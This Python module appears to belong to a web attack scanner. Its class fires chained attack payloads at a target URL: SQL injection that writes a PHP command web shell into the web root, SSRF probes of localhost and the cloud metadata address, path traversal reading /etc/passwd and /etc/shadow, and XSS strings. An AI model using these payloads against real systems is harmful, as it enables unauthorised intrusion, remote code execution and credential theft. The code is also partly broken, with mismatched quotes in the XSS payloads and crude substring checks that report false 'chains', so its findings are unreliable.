#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)


class ChainedAttackScanner:
    def __init__(self, target, verbose=False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.results = []
        self.chains = []

    def check_xss_to_sqli(self):
        """Check if XSS can lead to SQL injection"""
        log_info("Checking XSS -> SQLi chain...")
        try:
            # Test XSS payload that might lead to SQLi
            payloads = [
                "<script>fetch('/admin?sql=1' AND 1=1--)</script>",
                "<img src=x onerror='fetch(\"/admin?sql=1' AND 1=1--\")'>",
                "javascript:fetch('/admin?sql=1' AND 1=1--)",
            ]

            for payload in payloads:
                test_url = f"{self.target}?q={payload}"
                resp = requests.get(test_url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and (
                    "sql" in resp.text.lower() or "error" in resp.text.lower()
                ):
                    self.results.append(
                        {
                            "chain": "XSS -> SQLi",
                            "payload": payload,
                            "url": test_url,
                            "type": "chained_attack",
                        }
                    )
                    log_success(f"🔥 XSS -> SQLi chain possible: {payload[:50]}...")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error checking XSS->SQLi: {e}")

    def check_sqli_to_rce(self):
        """Check if SQLi can lead to RCE"""
        log_info("Checking SQLi -> RCE chain...")
        try:
            # Test SQLi payload that might lead to RCE
            payloads = [
                "1' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
                "1' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--",
                "1' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/tmp/shell.php'--",
            ]

            for payload in payloads:
                test_url = f"{self.target}?id={payload}"
                resp = requests.get(test_url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and (
                    "shell" in resp.text.lower() or "system" in resp.text.lower()
                ):
                    self.results.append(
                        {
                            "chain": "SQLi -> RCE",
                            "payload": payload[:50],
                            "url": test_url,
                            "type": "chained_attack",
                        }
                    )
                    log_success(f"🔥 SQLi -> RCE chain possible: {payload[:50]}...")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error checking SQLi->RCE: {e}")

    def check_ssrf_to_rce(self):
        """Check if SSRF can lead to RCE"""
        log_info("Checking SSRF -> RCE chain...")
        try:
            # Test SSRF payload that might lead to RCE
            payloads = [
                "http://localhost:8080/exec?cmd=id",
                "http://127.0.0.1:8080/admin?cmd=id",
                "http://169.254.169.254/latest/meta-data/",
                "gopher://localhost:8080/_GET%20/admin%20HTTP/1.0%0A%0A",
            ]

            for payload in payloads:
                test_url = f"{self.target}?url={payload}"
                resp = requests.get(test_url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and (
                    "root" in resp.text.lower() or "admin" in resp.text.lower()
                ):
                    self.results.append(
                        {
                            "chain": "SSRF -> RCE",
                            "payload": payload,
                            "url": test_url,
                            "type": "chained_attack",
                        }
                    )
                    log_success(f"🔥 SSRF -> RCE chain possible: {payload}")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error checking SSRF->RCE: {e}")

    def check_lfi_to_rce(self):
        """Check if LFI can lead to RCE"""
        log_info("Checking LFI -> RCE chain...")
        try:
            # Test LFI payload that might lead to RCE
            payloads = [
                "../../../../../../../../var/www/html/index.php",
                "../../../../../../../../etc/passwd",
                "../../../../../../../../etc/shadow",
                "php://filter/convert.base64-encode/resource=index.php",
            ]

            for payload in payloads:
                test_url = f"{self.target}?page={payload}"
                resp = requests.get(test_url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and (
                    "root:" in resp.text or "base64" in resp.text
                ):
                    self.results.append(
                        {
                            "chain": "LFI -> RCE",
                            "payload": payload,
                            "url": test_url,
                            "type": "chained_attack",
                        }
                    )
                    log_success(f"🔥 LFI -> RCE chain possible: {payload}")
        except Exception as e:
            if self.verbose:
                log_debug(f"Error checking LFI->RCE: {e}")

    def run(self):
        log_info(f"Starting Chained Attack Scanner on: {self.target}")

        self.check_xss_to_sqli()
        self.check_sqli_to_rce()
        self.check_ssrf_to_rce()
        self.check_lfi_to_rce()

        log_success(
            f"Chained Attack Scanner completed. Found {len(self.results)} chains."
        )
        return {
            "target": self.target,
            "scan_type": "chained_attack",
            "total_chains": len(self.results),
            "results": self.results,
        }
